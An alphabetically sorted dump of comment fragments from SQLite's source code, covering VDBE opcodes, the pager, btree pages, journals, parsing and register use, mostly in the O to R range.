 Opcode: VNext P1 P2 
 Opcode: VOpen P1 
 Opcode: VRename P1 
 Opcode: VUpdate P1 P2 P3 P4 
 Opcode: Vacuum 
 Opcode: Variable P1 P2 P3 P4 
 Opcode: VerifyCookie P1 P2 
 Opcodes executed since progress callback. 
 Open a blob handle.
 Open a btree level transaction on the main database. This allows a
 Open a cursor to the index to be analyzed
 Open a database file.
 Open a file.
 Open a journal file.
 Open a new cursor P1 to a transient table.
 Open a new cursor that points to a fake table that contains a single
 Open a new database handle.
 Open a read-only cursor for the database table whose root page is
 Open a read/write cursor named P1 on the table or index whose root
 Open a temporary file.
 Open a virtual index to use for the distinct set.
 Open all tables in the pTabList and any indices selected for
 Open and close a Pager connection. 
 Open cursors for the table we are deleting from and
 Open every index that needs updating.  Note that if any
 Open for both reading and writing 
 Open it and check if it points at the master journal. If
 Open mode flags 
 Open page 1 of the file for writing. 
 Open page to move 
 Open the backend database driver 
 Open the database in read-only mode 
 Open the journal file for pager pPager and write a journal header
 Open the journal file if it is not already open. 
 Open the journal for read/write access. This is because in
 Open the master journal. 
 Open the pager file.
 Open the pseudo-table used to store OLD if there are triggers.
 Open the sqlite_master table stored in database number iDb for
 Open the sqlite_stat1 table for writing. Unless it was created
 Open the sqlite_stat1 table on this cursor 
 Open the temp table for FOR EACH ROW triggers
 Opening flags 
 Operands of the opcode used to ends the loop 
 Operation       NULL            
 Operation       Savepoint Name  
 Operation performed by this node 
 Operation terminated by sqlite3_interrupt()
 Operational flags 
 Operations on page references. 
 Operators and special symbols 
 Optimizer Finished 
 Optimizer Start 
 Optimizer selects table %d for loop %d
 Optional %extra_argument parameter 
 Optional WHERE clause to be added 
 Optional database for lookaside.  Can be NULL 
 Optional list of named expressions 
 Options 
 Or if the UNPACKED_MATCH_PREFIX flag is set and the prefixes are
 Original name of the table 
 Original number of pages in file 
 Original schema cookie in destination 
 Original text of the default value 
 Originated in ON or USING clause of a join 
 OsTruncate() call used in exclusive-access mode also requires
 Other fatal errors return SQLITE_ERROR.
 Other keywords in the comment that follows each case are used to
 Other parameters record only the highwater mark and not the current
 Others complain about 0x7ffffffffffffffffLL.  The following macro seems
 Otherwise SQLITE_OK.
 Otherwise fall through to the next case 
 Otherwise fall through to the next instruction.
 Otherwise set 
 Otherwise the behavior is undefined.
 Otherwise useTempTable is true 
 Output buffer 
 Output each row of result 
 Output iterator 
 Output operand 
 Output should be DISTINCT 
 Output the final row of result
 Output will appear in correct order 
 Outputs 
 Outputs:
 Overall cost of pursuing this search strategy 
 Overflow page pointer-map entry page 
 Overflow pages form a linked list.  Each page except the last is completely
 Overflow payload available for local storage 
 Override onError to this if not OE_Default 
 Overwrite deleted information with zeros when the SECURE_DELETE
 P )
 P ) != 0
 P ) == P
 P if required.
 P1 
 P1 can be either an ordinary table or a virtual table.  There used to
 P1 cursor is pointing to into register P3.
 P1 is a 32-bit bitmask indicating whether or not each argument to the
 P1 is a boolean flag. If it is set to true and the xUpdate call
 P1 is a cursor number.  This opcode opens a cursor to the virtual
 P1 is a cursor opened using VOpen.  P2 is an address to jump to if
 P1 is an index.
 P1 is an open table cursor and P2 is a rowid integer.  Arrange
 P1 is currently point to.
 P1 is the database number which is 0 for the main database file
 P1 is the index of the database file on which the transaction is
 P1 is the index of the database in sqlite3.aDb[] of the database
 P1 must not be pseudo-table.  It has to be a real table with
 P1 value of the opcode 
 P1..P1
 P1>1.  Write the root page number of the new table into
 P2 
 P2 P3 P4 P5
 P2 contains the root-page of the table to lock.
 P2 in a database file.  The database file is determined by P3.
 P2 is the number of arguments that the step function takes and
 P2 is the number of columns in the virtual table.
 P2..P2
 P2==1 then the table to be clear is in the auxiliary database file
 P2==2 is the database format. P2==3 is the recommended pager cache
 P3 
 P3 Value for OP_VFilter 
 P3 as the accumulator.
 P3 is a flag that provides a hint to the b-tree layer that this
 P3 is a valid memory cell 
 P3 is the number of fields in the records that will be stored by
 P3. Register P3
 P3==1 is the schema version.  P3==2 is the database format.
 P3==1 then the table to be clear is in the auxiliary database file
 P4 
 P4 argument is only needed for the degenerate case where
 P4 contains a pointer to the name of the table being locked. This is only
 P4 is  used to do the comparison.  If P4 is not specified then
 P4 is a 32-bit signed integer 
 P4 is a 64-bit floating point value 
 P4 is a 64-bit signed integer 
 P4 is a KeyInfo structure that defines collating sequences and sort
 P4 is a pointer to a 64-bit floating point value.
 P4 is a pointer to a 64-bit integer value.
 P4 is a pointer to a CollSeq struct. If the next call to a user function
 P4 is a pointer to a CollSeq structure 
 P4 is a pointer to a FuncDef structure 
 P4 is a pointer to a KeyInfo structure 
 P4 is a pointer to a Mem
 P4 is a pointer to a VdbeFunc structure 
 P4 is a pointer to a transient string 
 P4 is a pointer to an sqlite3_vtab structure 
 P4 is a pointer to the FuncDef for this function.  The P2
 P4 is a string obtained from sqlite3_mprintf=()
 P4 is a string that is P2 characters long. The nth character of the
 P4 is a vector of 32-bit integers 
 P4 is either NULL or a string that was generated by the xBestIndex
 P4 is the name of a virtual table in database P1.  Call the xDestroy method
 P4 is the name of a virtual table in database P1. Call the xCreate method
 P4 may be a string that is P2 characters long.  The nth character of the
 P4 of OP_MakeRecord.
 P4 operand type 
 P4 points to a blob of data P1 bytes long.  Store this
 P4 points to a nul terminated UTF-8 string. This opcode is transformed
 P4_KEYINFO_HANDOFF is the usual way of dealing with this.
 P4_MPRINTF : P4_STATIC )
 P5 
 PAGERID() takes a pointer to a Pager struct as its argument. The
 PAGER_EXCLUSIVE : PAGER_UNLOCK ) )
 PAGER_JOURNALMODE_TRUNCATE or PAGER_JOURNALMODE_PERSIST.  But anything
 PAGER_LOCKINGMODE_EXCLUSIVE >= 0 )
 PAGER_NO_READLOCK ) != 0
 PAGER_OMIT_JOURNAL ) == 0
 PAGER_RESERVED means that there is an open rollback journal.
 PAGER_RESERVED state. And indeed SQLite never does this. But it is
 PAGER_RESERVED.  (Note that sqlite3PagerWrite() can only be
 PAGER_SHARED state. It tests if there is a hot journal present in
 PCache object 
 PENDING:   A single process may hold a PENDING lock on a file at
 PENDING_BYTE defines the beginning of the locks.  By default PENDING_BYTE
 PENDING_BYTE page.
 PENDING_BYTE_PAGE.
 PGHDR flags defined below 
 PGHDR1_TO_PAGE( pPage ) : null )
 PGHDR1_TO_PAGE() macro takes a pointer to a PgHdr1 structure as
 PGHDR_DIRTY ) != 0
 PGHDR_DIRTY ) != 0 
 PGHDR_DIRTY ) != 0 )
 PGHDR_DIRTY ) )
 PGHDR_DIRTY ) == 0 )
 PGHDR_DONT_WRITE ) )
 PGHDR_NEED_SYNC )
 PGHDR_NEED_SYNC ) != 0 
 PGHDR_NEED_SYNC ) != 0 )
 PGHDR_NEED_SYNC ) != 0 ) 
 PGHDR_NEED_SYNC ) )
 PGHDR_NEED_SYNC )!=0)
 PLAN 
 PRAGMA 
 PRIMARY 
 PRIMARY KEY or UNIQUE keywords are parsed.  Those keywords will cause
 PTF_INTKEY
 PTF_INTKEY 
 PTF_INTKEY))
 PTF_LEAF
 PTF_LEAF 
 PTF_LEAF)
 PTF_LEAF) == 0 
 PTF_LEAF) == 0)
 PTF_LEAF))
 PTF_LEAFDATA 
 PTF_LEAFDATA)
 PTRMAP_BTREE:     pPage is a btree-page. The pointer points at a child
 PTRMAP_BTREE: The database page is a non-root btree page. The page number
 PTRMAP_FREEPAGE: The database page is an unused (free) page. The page-number
 PTRMAP_OVERFLOW1: The database page is the first page in a list of
 PTRMAP_OVERFLOW1: pPage is a btree-page. The pointer points at an overflow
 PTRMAP_OVERFLOW2 : PTRMAP_OVERFLOW1)
 PTRMAP_OVERFLOW2: The database page is the second or later page in a list of
 PTRMAP_OVERFLOW2: pPage is an overflow-page. The pointer points at the next
 PTRMAP_PAGENO returns the database page number of the pointer-map
 PTRMAP_ROOTPAGE: The database page is a root-page. The page-number is not
 Packed key if the btree is an index 
 Page Allocation/SQLITE_CONFIG_PCACHE Related Functions 
 Page being freed. May be NULL. 
 Page cache buffer management:
 Page cache memory 
 Page containing pPayload 
 Page containing root of this index in database file 
 Page containing the cell 
 Page copies (apCopy) 
 Page has changed 
 Page into which we are copying 
 Page number PAGER_MJ_PGNO is never used in an SQLite database (it is
 Page number for first page in the list 
 Page number for this page 
 Page number of free-list trunk page 
 Page number of pNew 
 Page number of the new child page 
 Page number of the next source page to copy 
 Page number of the page to check 
 Page number to clear 
 Page number to fetch 
 Page number to obtain 
 Page number to read 
 Page pParent is an internal (non-leaf) tree page. This function
 Page size 
 Page sizes are constrained to be a power of two so that the region
 Page to delete cell from 
 Page to journal 
 Page type flags.  An ORed combination of these flags appear as the
 Page-size field of journal header 
 Pager Delegates
 Pager object 
 Pager object associated with page pPg 
 Pager object to allocate and return 
 Pager page handle 
 Pager structure 
 Pager structure and close the file.
 Pager.aSavepoint and Pager.nSavepoint to zero. Close the sub-journal
 Pager.journalOff variable by JOURNAL_HDR_SZ so that the next
 Pager.pInJournal bitvec and the PagerSavepoint.pInSavepoint bitvecs
 Pager.pInJournal bitvec structure is allocated.
 Pager.pageSize and to allocate the Pager.pTmpSpace buffer.
 Pager.pageSize bytes of space for tmp use 
 PagerSavepoint.iHdrOffset fields now.
 PagerSavepoint.iOffset and continuing to the next journal header.
 PagerSetPagesize() is tested.
 Pages are played back from the main journal starting at byte
 Pages from root to current page 
 Pages journalled since last j-header written 
 Pagesize after VACUUM if >0 
 Parameter aData must point to a buffer of pPager.pageSize bytes
 Parameter op is always either SAVEPOINT_ROLLBACK or SAVEPOINT_RELEASE.
 Parameter zMaster is the name of a master journal file. A single journal
 Parameter zName points to a UTF-8 encoded string nName bytes long.
 Parameter zName points to a nul-terminated buffer containing the name
 Parameter zSrcData points to a buffer containing the data for
 Parameters of the form 
 Parameters:
 Parent class. MUST BE FIRST 
 Parent context 
 Parent page of siblings being balanced 
 Parent savepoint (if any) 
 Parse a cell content block and fill in the CellInfo structure.  There
 Parse a timezone extension on the end of a date-time.
 Parse context 
 Parse context. 
 Parse dates of the form
 Parse times of the form HH:MM or HH:MM:SS or HH:MM:SS.FFFF.
 Parser context 
 Parser context. 
 Parser context.  
 Parsing and code generating context 
 Parsing context 
 Parsing context for error messages 
 Parsing context to record errors 
 Parsing context.  Leave error messages here 
 Parsing contexts 
 Part of the record being decoded 
 Patch up the ORDER BY clause
 Pending lock page 
 Percent symbol. %% 
 Perform a read or write operation on a blob
 Perform a reduce action and the shift that must immediately
 Perform a shift action.
 Perform a single step of the incremental vacuum procedure on
 Perhaps it was called on a [prepared statement] that has
 Perhaps the name is a reference to the ROWID
 Permitted values of the SrcList.a.jointype field
 Permutation of columns for OP_Compare 
 PgHdr p
 Playback and delete the journal.  Drop the database write
 Playback the journal and thus restore the database file to
 Please pay particular attention to the fact that the pointer returned
 Pluggable cache module 
 Pointer map 'page-no' entry for pDbPage 
 Pointer map 'type' entry for pDbPage 
 Pointer map page data 
 Pointer map page index 
 Pointer to 1 byte past the end of 
 Pointer to <id> token 
 Pointer to Actual Page Header 
 Pointer to BtShared that this page is part of 
 Pointer to a new child page 
 Pointer to a single the cell bodies 
 Pointer to a static string 
 Pointer to a string obtained from sqliteMalloc=()
 Pointer to an array of results 
 Pointer to application-specific data 
 Pointer to buffer 
 Pointer to buffer containing name 
 Pointer to busy-handler function 
 Pointer to cell to delete 
 Pointer to complete record-data 
 Pointer to current cell in pPage 
 Pointer to data for pPage 
 Pointer to data for string (char array) types 
 Pointer to database schema (possibly shared)  
 Pointer to disk image of the page data 
 Pointer to first byte after the header 
 Pointer to first entry with this hash 
 Pointer to function information.  MUST BE FIRST 
 Pointer to list of ongoing backup processes 
 Pointer to module implementation 
 Pointer to new Btree object written here 
 Pointer to one of the indices 
 Pointer to page cache object 
 Pointer to page data 
 Pointer to space allocated by sqlite3BtreeSchema() 
 Pointer to the appropriate info structure 
 Pointer to the cell text. 
 Pointer to the conversion buffer 
 Pointer to the data to be bound 
 Pointer to the end of the file 
 Pointer to the end of the last xRead() 
 Pointer to the minor token to shift in 
 Pointer to the rightmost select in sub-query 
 Pointer to the start of cell content 
 Pointer to the subexpression that is this term 
 Pointer to trigger-stack entry 
 Pointer to vfs object 
 Pointer to virtual tables needing locking 
 Pointer to vtab instance 
 Pointers to :aaa and $aaaa wildcard expressions 
 Pointers to cell bodies 
 Pointers to instances of struct Trigger are stored in two ways.
 Pointers to structures of this type are cast and returned as
 Pointers to the body of the overflow cell 
 Pointers to the end of  sqlite3GlobalConfig.pScratch and
 Pointers to the extension init functions 
 Pop an authorization context that was previously pushed
 Pop the entry off the trigger stack 
 Pop the parser's stack once.
 Populate the OLD.
 Populate the PagerSavepoint structures just allocated. 
 Populate the index search key. 
 Populate the low-level memory allocation function pointers in
 Possible values for FuncDef.flags
 Possible values for the sqlite.flags and or Db.flags fields.
 Possible values for the sqlite.magic field.
 Possibly overload the function if the first argument is
 Possibly relative input path 
 Potential values for BtCursor.eState.
 Pragma Name     1st arg or NULL 
 Pragmas are of this form:
 Preallocated space for the PCache 
 Precision of the current field 
 Preevaluate constant subexpressions within pExpr and store the
 Preferred text encoding 
 Prepare a crude estimate of the logarithm of the input value.
 Prepare a virtual machine for execution.  This involves things such
 Prerequesites of pExpr 
 Prerequesites of the pExpr.pLeft 
 Preserve the default page cache size 
 Preserve the text encoding 
 Preserve the user version 
 Prev() is noop if negative. Next() is noop if positive 
 Prevent ON clause terms of a LEFT JOIN from being used to drive
 Prevents a race condition. Ticket 
 Previous element in list of dirty pages 
 Previous in LRU list of unpinned pages 
 Previous result register.  No uniqueness if 0 
 Previous versions of SQLite called moveToRoot() to move the cursor
 Previously accessed hash elemen 
 Primary error code from p.rc 
 Print a single opcode.  This routine is used for debugging only.
 Print an IOTRACE message showing SQL content.
 Print into memory obtained from sqlite3Malloc()().  Omit the internal
 Print into memory obtained from sqlite3Malloc().  Omit the internal
 Print into memory obtained from sqliteMalloc().  Use the internal
 Print the SQL that was used to generate a VDBE program.
 Print the value of a register for tracing purposes:
 Prior select in a compound select statement 
 Private copies of apOld[] pages 
 Process a modifier to a date-time stamp.  The modifiers are
 Process a pragma statement.
 Process an UPDATE statement.
 Process the ORDER BY clause for singleton SELECT statements.
 Process time function arguments.  argv[0] is a date-time stamp.
 Processing for aggregates with GROUP BY is very different and
 Processing is determine by the affinity parameter:
 Profiling function 
 Program counter 
 Program counter at start of opcode 
 Properties of opcodes.  The OPFLG_INITIALIZER macro is
 Prototypes for the VDBE interface.  See comments on the implementation
 Provide a default value for SQLITE_TEMP_STORE in case it is not specified
 Ptr to head of pagers backup list 
 Ptr(1) 
 Ptr(N) 
 Public interfaces:
 Pull data from this table 
 Pull the requested columns.
 Push an entry on to the trigger stack 
 Push the record number for the new entry onto the stack.  The
 Put a copy of the Table struct in Parse.pNewTable for the
 Put error message here if not 0 
 Put saved Parse.zAuthContext here 
 Put the new pages in accending order.  This helps to
 Put the results here 
 QUERY 
 Quasi-random value added to every checksum 
 Query a blob handle for the size of the data.
 Query flattening in sqlite3Select() might refill p.pOrderBy.
 Query status information for a single database connection
 Query status information.
 Query the BtShared.pHasContent vector.
 Query the schema of the main database. Create a mirror schema
 Query the size of the file in bytes.
 Query to see if btree handle p may obtain a lock of type eLock
 Quote character 
 RAISE 
 READ_LOCK or WRITE_LOCK 
 REAL 
 REFERENCES 
 REGEXP 
 REINDEX 
 RELEASE 
 RENAME 
 REPLACE 
 RESERVED:  A single process may hold a RESERVED lock on a file at
 RESTRICT 
 RESTRICT is the same as ABORT for IMMEDIATE foreign keys and the
 RHS must not overlap with this mask 
 RIGHT 
 ROLLBACK 
 ROUND8(sizeof(MemPage))
 ROW 
 ROWID of most recent insert (see above) 
 ROWID value for this entry 
 ROWIDs] when inserting new records into a table that
 Race condition here:  Another process might have been holding the
 Ran out of input before finding an opening bracket. Return NULL. 
 Ran out of input before finding the table name. Return NULL. 
 Random numbers are used by some of the database backends in order
 Randomly chosen byte used as a shared lock 
 Range of content 
 Read a 32-bit integer from the given file descriptor.  Store the integer
 Read a 32-bit variable-length integer from memory starting at p[0].
 Read a 64-bit variable-length integer from memory starting at p[0].
 Read a single page from either the journal file (if isMainJrnl==1) or
 Read an entry from the pointer map.
 Read and parse all entries from the SQLITE_MASTER table of database P1
 Read and parse the table header.  Store the results of the parse
 Read and write return code from here 
 Read cookie number P3 from database P1 and write it into register P2.
 Read data from a blob handle.
 Read data from a file into a buffer.  Return SQLITE_OK if all
 Read data from the file.
 Read data from the in-memory journal file.  This is the implementation
 Read in the complete content of the index entry 
 Read in the first 8 bytes of the journal header. If they do not match
 Read or write a four-byte big-endian integer value.
 Read or write a two- and four-byte big-endian integer values.
 Read part of the data associated with cursor pCur.  Exactly
 Read part of the key associated with cursor pCur.  Exactly
 Read text from z[] and convert into a floating point number.  Return
 Read the content for page pPg out of the database file and into
 Read the first N bytes from the beginning of the file into memory
 Read the first three 32-bit fields of the journal header: The nRec
 Read the meta-information out of a database file.  Meta[0]
 Read the next journal header from the journal file.  If there are
 Read the page number and page data from the journal or sub-journal
 Read the page-size and sector-size journal header fields. 
 Read the rowid (the last field in the record) and store it in 
 Read the schema cookie from the database. If it does not match the 
 Read the schema information out of the schema tables
 Read the serial types for the next element in each key. 
 Read the specified cookie value 
 Read the sqlite_stat1 table for database P1 and load the content
 Read the value of meta[3] from the database to determine where the
 Read this many bytes 
 Read-only system table 
 Readlocks are omitted when
 Real value 
 Real value of left operand 
 Real value of right operand 
 Reason for ALWAYS:  There must be at least on unlocked Btree in
 Reassembly the compound query so that it will be freed correctly
 Reattach the ORDER BY clause to the query.
 Reclaim all memory used by the VDBE
 Reclaim the memory used by an index
 Recompute all indices of all tables in all databases where the
 Recompute all indices of pTab that use the collating sequence pColl.
 Record changes in the file format 
 Record in the column cache that a particular column from a
 Record in the query plan information about the current table
 Record the continuation address in the WhereInfo structure.  Then
 Record the fact that an affinity change has occurred on iCount
 Record the fact that we want to lock a table at run-time.
 Record the instruction used to terminate the loop. Disable
 Record the set of tables that satisfy case 2.  The set might be
 Records are used to store the content of a table row and to store
 Recovery action to do in case of an error 
 Recursive representation 
 Recursively delete a Trigger structure
 Recursively delete an expression tree.
 Recursively resolve names in all subqueries
 Refer to comments above function sqlite3VtabUnlockList() for an
 Refer to documentation on individual methods above for additional
 Refer to source code comments for the details of the record
 Refer to the [SQL parameter] documentation for additional information.
 Reference counted.
 Reference to page 1 
 Reference:  Meeus page 61
 References to the page pPg remain valid. Updating any
 Reg with value of this column. 0 means none. 
 Register Allocations 
 Register P2 holds a SQL index key made using the
 Register P3 holds a blob constructed by MakeRecord.  P1 is
 Register P3 holds a blob constructed by MakeRecord.  P1 is an index.
 Register P3 is assumed to hold a 64-bit integer value. If register P1
 Register P3 must not be one of the function inputs.
 Register a VFS with the system.  It is harmless to register the same
 Register a callback to be invoked each time a transaction is rolled
 Register a collation sequence factory callback with the database handle
 Register a function to be invoked when a transaction comments.
 Register a new collation sequence with the database handle db.
 Register a profile function.  The pArg from the previously registered
 Register a statically linked extension that is automatically
 Register a trace function.  The pArg from the previously registered trace
 Register allocations 
 Register an unlock-notify callback.
 Register block for building records 
 Register built-in functions used to help implement ALTER TABLE
 Register containing first data column 
 Register for RowSet object 
 Register for rowset of rows to delete 
 Register holding assemblied index record 
 Register holding completed record 
 Register holding data to be sorted 
 Register holding largest rowid for AUTOINCREMENT 
 Register holding max rowid 
 Register holding maximum rowid 
 Register holding operands 
 Register holding results 
 Register holding root page number for new objects 
 Register holding rowid 
 Register holding rowid of CREATE TABLE entry 
 Register holding the AUTOINCREMENT counter 
 Register hooks to call to indicate which malloc() failures
 Register hooks to call when sqlite3BeginBenignMalloc() and
 Register keeping track of errors remaining 
 Register numbers are always positive 
 Register recording end of SELECT data 
 Register that records whether NULLs exist in RHS 
 Register the built-in LIKE and GLOB functions.  The caseSensitive
 Register this backup object with the associated source pager for
 Register to copy from 
 Register to copy to 
 Register to hold name of table 
 Register to hold packed record 
 Register to hold temp table ROWID 
 Register used by each index.  0 for unused indices 
 Register used to hold aliased result 
 Register used with OP_Gosub 
 Register where left operand is stored 
 Register where right operand is stored 
 Registered sqlite3_vfs objects are kept on a linked list formed by
 Registering a NULL function disables the callback.
 Registers containing the index key 
 Registers for holding the start boundary 
 Registers holding data and rowid 
 Regular function 
 Reinitialize page pTo so that the contents of the MemPage structure
 Reinstall the LIKE and GLOB functions.  The variant of LIKE
 Release a MemPage.  This should be called once for each prior
 Release a lock acquired by winceMutexAcquire()
 Release a page reference.
 Release all resources associated with an sqlite3_backup
 Release all the table locks (locks obtained via calls to
 Release an array of N Mem elements
 Release any memory held by the Mem. This may leave the Mem in an
 Release temporary registers
 Release the BtShared mutex associated with B-Tree handle p and
 Release the STATIC_MASTER mutex.
 Release the locks 
 Release the page reference. 
 Release the reference to the new page. 
 Releasing a pending lock 
 Releasing a reader lock or an exclusive lock 
 Releasing a reserved lock 
 Reload the schema of the modified table. 
 Remember that a rollback can delete tables complete and
 Remember the SQL string for a prepared statement.
 Remember the current column cache context.  Any new entries added
 Remember the rowid of every item to be updated.
 Remember this case if it is the best so far 
 Remove a single entry from the hash table given a pointer to that
 Remove a trigger from the hash tables of the sqlite
 Remove all entries from a hash table.  Reclaim all memory.
 Remove all pages with pgno>x.  Reset the cache if x==0 
 Remove any and all aliases between the result set and the
 Remove any entries of the sqlite_sequence table associated with
 Remove connection db from the blocked connections list. If connection
 Remove connection p from the blocked connections list. 
 Remove either the OP_OpenWrite or OpenRead. Set the P2
 Remove from the column cache any entries that were added since the
 Remove harmful bits from the flags parameter
 Remove page from cache 
 Remove page pPage from the list of dirty pages.
 Remove result from a UNION index 
 Remove the i-th cell from pPage.  This routine effects pPage only.
 Remove the internal (in-memory) data structures that describe
 Remove the memory data structures associated with the given
 Remove the page from the files free-list. This is not required
 Remove the page supplied as an argument from the hash table
 Remove the slot from the free-list. Update the number of
 Remove the sqlite3_vtab
 Remove the table entry from SQLite's internal schema and modify
 Reparse everything to update our internal data structures 
 Replace the backslashes from the filename and lowercase it
 Replace the last recently used 
 Report an error if any column mentioned in the USING clause is
 Report malloc errors here 
 Report malloc errors to this connection 
 Report the allocated size of a prior return from xMalloc()
 Report the best result
 Report the current page size and number of reserved bytes back
 Report the current state of file logs for all databases
 Reports from the internet are that performance is always
 Reposition cursor P1 so that  it points to the largest entry that
 Reposition cursor P1 so that  it points to the smallest entry that
 Reposition cursor P1 so that it points to the largest entry that
 Reprepare only called for prepare_v2() statements 
 Request is out of range. Return a transient error. 
 Require a write-lock on the table to perform this operation 
 Required because bestIndex() is called by bestOrClauseIndex()
 Required lock type (READ_LOCK or WRITE_LOCK) 
 Required table locks for shared-cache mode 
 Requirements:
 Requirements: [H10011] [H10014]
 Requirements: [H10021] [H10022] [H10023]
 Requirements: [H10101] [H10102]
 Requirements: [H10201] [H10202]
 Requirements: [H10331] [H10336] [H10337] [H10339]
 Requirements: [H10511] [H10512]
 Requirements: [H10533] [H10536]
 Requirements: [H12931] [H12932] [H12933] [H12934]
 Requirements: [H13123]
 Requirements: [H13143] [H13146] [H13149] [H13152]
 Requirements: [H17341] [H17342]
 Rerun the compilation of a statement after a schema change.
 Reserved for future use 
 Reset an StrAccum string.  Reclaim all malloced memory.
 Reset and close the cache object 
 Reset high-water mark if true 
 Reset the PRNG back to its uninitialized state.  The next call
 Reset the aggregate accumulator.
 Reset the automatic extension loading mechanism.
 Resize an allocation 
 Resize the Vdbe.aOp array so that it is at least one op larger than
 Resize the block of memory pointed to by p to n bytes. If the
 Resolve all names in all expressions of a SELECT and in all
 Resolve all names in the ORDER BY term expression
 Resolve an expression that was part of an ATTACH or DETACH statement. This
 Resolve function names
 Resolve names in all CHECK constraint expressions.
 Resolve names in the SELECT statement p and all of its descendents.
 Resolve names in the result set. 
 Resolve symbolic names into TK_COLUMN operators for the current
 Resolve the ORDER BY on a compound SELECT after all terms of
 Resolve the column names in all the expressions in the
 Resolve the column names in all the expressions of the
 Resolve the column names in the WHERE clause.
 Resolve the expressions in the LIMIT and OFFSET clauses. These
 Resolve the expressions in the SELECT statement and execute it. 
 Restart the backup process. This is called when the pager layer
 Restore the Vdbe context to the state it was in when contextPush was last
 Restore the cursor to the position it was in (or as close to as possible)
 Restore the original value of db.flags 
 Restore the state of the PRNG to the last state saved using
 Restriction (1)  
 Restriction (11) 
 Restriction (13) 
 Restriction (14) 
 Restriction (15) 
 Restriction (16) 
 Restriction (19) 
 Restriction (2)  
 Restriction (6)  
 Restriction (7)  
 Restriction 12:  If the subquery is the right operand of a left outer
 Restriction 18. 
 Restriction 20 
 Restrictions (4)(5)(8)(9) 
 Result code 
 Result code from this function 
 Result code of a subroutine 
 Result code stored here 
 Result is a column 
 Result needed in a specific register 
 Result of ANALYZE: Est. rows selected by each column 
 Result of a windows lock call 
 Result of an sqlite3BtreeLast() 
 Result of last OP_Compare operation 
 Result of last sqlite3BtreeMoveto() done by an OP_NotExists or
 Result of prior MovetoUnpacked() call 
 Result returned from from sqlite3_get_table() 
 Result set expression list 
 Results of the query 
 Results stored in register inReg 
 Retrieve a page from the pager cache. If the requested page is not
 Retrieve a pointer to a static mutex or allocate a new dynamic one.
 Retrieve the current malloc() implementation 
 Retrieve the current mutex implementation 
 Return 0 if it involves variables or function calls or terms from
 Return 0 on success and 1 if there is any kind of error.
 Return 1 if there are 2 ore more references to the page and 0 if
 Return 1 if there is a parsing error and 0 on success.
 Return Code 
 Return HH:MM:SS
 Return N random u8s.
 Return NULL if not found.
 Return SQLITE_ERROR if the finalizer reports an error.  SQLITE_OK
 Return SQLITE_LOCKED_SHAREDCACHE if another user of the same shared
 Return SQLITE_OK on success and SQLITE_ERROR if something goes wrong.
 Return SQLITE_OK on success and an error code if we cannot obtain
 Return SQLITE_OK on success or SQLITE_NOMEM if malloc fails.
 Return SQLITE_OK on success or an error code if anything goes
 Return SQLITE_OK on success.
 Return SQLITE_OK on success.  If we see that the page does
 Return SQLITE_ROW
 Return TRUE (non-zero) of the statement supplied as an argument needs
 Return TRUE if any of the expressions in pList.a[iFirst...] contain
 Return TRUE if pExpr is an constant expression that is appropriate
 Return TRUE if the cursor is not pointing at an entry of the table.
 Return TRUE if the database file is opened read-only.  Return FALSE
 Return TRUE if the given SQL string ends in a semicolon.
 Return TRUE if the given btree is set to safety level 1.  In other
 Return TRUE if the given operator is one of the operators that is
 Return TRUE if the given string is a row-id column name.
 Return TRUE if the page given in the argument was previously passed
 Return TRUE if the resize occurs and false if not.
 Return TRUE if z is a pure numeric string.  Return FALSE and leave
 Return TRUE if zNum is a 64-bit signed integer and write
 Return UTF-16 encoded English language explanation of the most recent
 Return UTF-8 encoded English language explanation of the most recent
 Return WRC_Abort or WRC_Continue.
 Return WRC_Continue under normal conditions.  Return WRC_Abort if
 Return YYYY-MM-DD
 Return YYYY-MM-DD HH:MM:SS
 Return a 32-bit hash of the page data for pPage.
 Return a dynamicly allocated KeyInfo structure that can be used
 Return a human-readable name for a constraint resolution action.
 Return a list of all triggers on table pTab if there exists at least
 Return a new SrcList which encodes is the FROM with the new
 Return a pointer to a string containing the 'declaration type' of the
 Return a pointer to payload information from the entry that the
 Return a pointer to the Table structure for the table that a trigger
 Return a pointer to the VTable object used by connection db to access 
 Return a pointer to the collation sequence that should be used by
 Return a pointer to the data for the specified page.
 Return a pointer to the enlarged SrcList 
 Return a pointer to the new RowSet object.
 Return a pointer to the next prepared statement after pStmt associated
 Return a pointer to the pPager.pBackup variable. The backup module
 Return a pointer to the resulting string.  Return a NULL
 Return a pointer to the root of the constructed binary tree.
 Return a pointer to the term.  Return 0 if not found.
 Return a register number which is the first in a block of
 Return a section of the pPage.aData to the freelist.
 Return a single row for each column of the named table. The columns of
 Return a static string that describes the kind of error specified in the
 Return a string described by FORMAT.  Conversions as follows:
 Return a vector of device characteristics.
 Return address register for output subroutine 
 Return address register for reset subroutine 
 Return an error (non-zero) if the magic was not SQLITE_MAGIC_BUSY
 Return an error (non-zero) if the magic was not SQLITE_MAGIC_OPEN
 Return an error code.  If the commit could not complete because of
 Return an error if we get here 
 Return an error.
 Return code 
 Return code from execution 
 Return code from service routines 
 Return code from subfunctions 
 Return code from subroutines 
 Return code from the parse-tree walking primitives and their
 Return either the pDef argument (indicating no change) or a 
 Return from sqlite3IsNumber().  Not used 
 Return from sqlite3WhereBegin() 
 Return meta information about a specific column of a database table.
 Return non-zero if a read (or write) transaction is active.
 Return non-zero if a transaction is active.
 Return non-zero if the table pTab in database iDb or any of its indices
 Return number of characters processed so far. %n 
 Return open Btree
 Return or set the local value of the synchronous flag.  Changing
 Return or set the local value of the temp_store flag.  Changing
 Return or set the local value of the temp_store_directory flag.  Changing
 Return or set the value of the lock_proxy_file flag.  Changing
 Return some kind of integer value which is the best we can do
 Return the 'affinity' of the expression pExpr if any.
 Return the CollSeq
 Return the P5 value that should be used for a binary comparison
 Return the ROWID of the most recent insert
 Return the SQL associated with a prepared statement
 Return the VFS structure for the pager.
 Return the address of the next instruction to be inserted.
 Return the amount of memory currently checked out.
 Return the appropriate collating sequence for the iCol-th column of
 Return the ascii code for the leading digit of 
 Return the best representation of pMem that we can get into a
 Return the bitmask for the given cursor number.  Return 0 if
 Return the cached rowid for the given cursor.  A negative or zero
 Return the collating function associated with a function.
 Return the column declaration type (if applicable) of the 'i'th column
 Return the current value of a status parameter.
 Return the currently defined page size
 Return the database associated with the Vdbe.
 Return the default collation sequence for the expression pExpr. If
 Return the file handle for the database file associated
 Return the full pathname of the database file.
 Return the full pathname of the journal file.
 Return the full pathname of the underlying database file.
 Return the index in pList of the identifier named zId.  Return -1
 Return the index of a column in a table.  Return -1 if the column
 Return the index of an SQL parameter given its name.  The
 Return the julian day number of the date specified in the arguments
 Return the length of the data corresponding to the supplied serial-type.
 Return the length of the token that begins at z[0].
